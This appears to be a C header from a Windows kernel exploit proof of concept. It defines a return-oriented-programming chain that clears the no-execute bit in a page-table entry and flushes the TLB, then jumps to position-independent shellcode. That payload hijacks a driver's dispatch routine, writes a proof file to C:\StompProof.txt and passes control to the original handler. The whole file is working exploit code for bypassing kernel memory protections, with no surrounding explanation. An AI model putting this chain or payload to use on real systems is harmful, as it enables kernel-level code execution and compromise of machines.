#pragma once
#include "Utils.h"

// --- ROP Chain Structure (The Bridge) ---
struct ROP_CHAIN {
    uint64_t PopRcx;        // Gadget: pop rcx ; ret
    uint64_t PteAddress;    // Value:  Address of the PTE
    uint64_t PopRax;        // Gadget: pop rax ; ret
    uint64_t PteMask;       // Value:  0x7FFFFFFFFFFFFFFF
    uint64_t AndRcxRax;     // Gadget: and [rcx], rax ; ret
    uint64_t Invlpg;        // Gadget: invlpg [rcx] ; ret
    uint64_t PopRax2;       // Gadget: pop rax ; ret
    uint64_t PayloadAddr;   // Value:  Address of CovertEntry
    uint64_t JmpRax;        // Gadget: jmp rax
};

// --- Updated Context Structure ---
// We added slots for ZwCreateFile, ZwWriteFile, and ZwClose
struct SHELLCODE_CTX {
    uint64_t PteAddress;
    uint64_t OriginalDispatch;
    uint64_t DbgPrint;
    uint64_t MmGetSystemRoutine;
    uint64_t ZwCreateFile;      // <--- ADDED
    uint64_t ZwWriteFile;       // <--- ADDED
    uint64_t ZwClose;           // <--- ADDED
};

// --- The Covert Payload ---
NTSTATUS __stdcall CovertEntry(PDEVICE_OBJECT DeviceObject, PIRP Irp, SHELLCODE_CTX* ctx) {

    // 1. Define Function Pointers (PIC Style)
    typedef ULONG(*tDbgPrint)(PCSTR Format, ...);
    typedef NTSTATUS(*tZwCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    typedef NTSTATUS(*tZwWriteFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
    typedef NTSTATUS(*tZwClose)(HANDLE);
    typedef VOID(*tRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

    tDbgPrint pDbgPrint = (tDbgPrint)ctx->DbgPrint;
    tZwCreateFile pZwCreateFile = (tZwCreateFile)ctx->ZwCreateFile;
    tZwWriteFile pZwWriteFile = (tZwWriteFile)ctx->ZwWriteFile;
    tZwClose pZwClose = (tZwClose)ctx->ZwClose;

    // 2. Execution Confirmation (Debug Print)
    if (pDbgPrint) {
        pDbgPrint("[+] ROP-FLIP SUCCESSFUL! Executing in .data!\n");
        pDbgPrint("    PTE at %llX was modified.\n", ctx->PteAddress);
    }

    // 3. Write Proof to File (C:\StompProof.txt)
    // We construct the string manually on the stack to avoid .rdata dependency issues in position-independent code
    wchar_t fileNameBuffer[] = L"\\??\\C:\\StompProof.txt";
    UNICODE_STRING fileName;
    fileName.Length = sizeof(fileNameBuffer) - sizeof(wchar_t);
    fileName.MaximumLength = sizeof(fileNameBuffer);
    fileName.Buffer = fileNameBuffer;

    OBJECT_ATTRIBUTES objAttr;
    // Manual InitializeObjectAttributes
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &fileName;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    HANDLE fileHandle;
    IO_STATUS_BLOCK ioStatus;

    // Create or Open the file
    NTSTATUS status = pZwCreateFile(&fileHandle,
        FILE_APPEND_DATA | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    if (NT_SUCCESS(status)) {
        char msg[] = "Covert Execution Successful - ROP Chain Verified!\r\n";
        pZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatus, msg, sizeof(msg) - 1, NULL, NULL);
        pZwClose(fileHandle);
        if (pDbgPrint) pDbgPrint("[+] Proof written to C:\\StompProof.txt\n");
    }
    else {
        if (pDbgPrint) pDbgPrint("[-] Failed to create proof file: 0x%X\n", status);
    }

    // 4. Pass-through to Original Driver
    typedef NTSTATUS(*tDispatch)(PDEVICE_OBJECT, PIRP);
    tDispatch original = (tDispatch)ctx->OriginalDispatch;

    return original(DeviceObject, Irp);
}

void CovertEntryEnd() {}